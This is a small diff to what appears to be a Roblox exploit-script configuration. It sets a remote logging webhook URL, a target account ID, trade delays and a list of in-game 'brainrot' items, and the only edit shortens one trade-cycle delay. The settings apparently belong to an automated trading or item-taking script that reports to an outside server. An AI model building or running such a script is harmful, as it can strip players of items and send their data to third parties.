@@ -1,7 +1,7 @@
 getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_5c719cba76b94b549e6f4663931f324a"
 getgenv().TARGET_ID = 2525631212
 getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TRADE_CYCLE_DELAY = 1
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
